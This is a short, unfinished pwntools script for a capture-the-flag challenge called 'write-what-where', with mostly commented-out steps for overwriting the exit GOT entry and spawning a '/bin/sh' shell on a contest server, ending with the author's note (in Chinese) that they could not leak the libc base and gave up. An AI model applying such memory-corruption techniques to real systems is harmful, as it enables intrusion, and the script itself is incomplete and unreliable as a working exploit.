from pwn import *
context.log_level = 'debug'

libc = ELF('./libc.so.6')
e = ELF('./write-what-where')
print(hex(libc.sym['system']), hex(libc.sym['puts']))
# if args.LOCAL:
#     p = process('./write-what-where')
#     print(p.pid)
#     pause()
# else:
#     p = remote('pwn-2021.duc.tf', 31920)

# p.sendafter('what?\n', p64(e.sym['main'])[:4])
# # p.sendafter('what?\n', p64(e.plt['read']))
# p.sendafter('where?\n', str(e.got['exit']).encode())

# payload = b'/bin/sh\x00'
# p.interactive()

# 不知道怎么泄露libc基址，爬了